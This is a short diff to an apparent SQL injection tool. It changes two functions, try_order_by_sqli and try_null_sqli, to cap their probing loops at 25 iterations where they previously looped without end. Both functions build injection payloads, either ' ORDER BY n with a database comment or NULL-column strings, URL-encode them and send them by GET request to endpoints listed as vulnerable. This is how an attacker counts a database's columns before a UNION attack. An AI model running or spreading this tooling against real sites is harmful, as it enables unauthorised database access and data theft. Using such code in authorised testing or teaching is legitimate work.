@@ -11,7 +11,7 @@ def try_order_by_sqli(url, options: list):
     db_comment = options[1]
     index = 1
     for endp in vuln_endpoints:
-        while True:
+        for i in range(0, 25):
             pld = "' ORDER BY " + str(index) + db_comment
             pld = requests.utils.quote(pld)
             r = requests.get(url=url + endp + pld)
@@ -46,7 +46,7 @@ def try_null_sqli(url, options: list):
     db_comment = options[1]
     index = 1
     for endp in vuln_endpoints:
-        while True:
+        for i in range(0, 25):
             pld = generate_null_pld(db_comment, index)
             pld = requests.utils.quote(pld)
             r = requests.get(url=url + endp + pld)
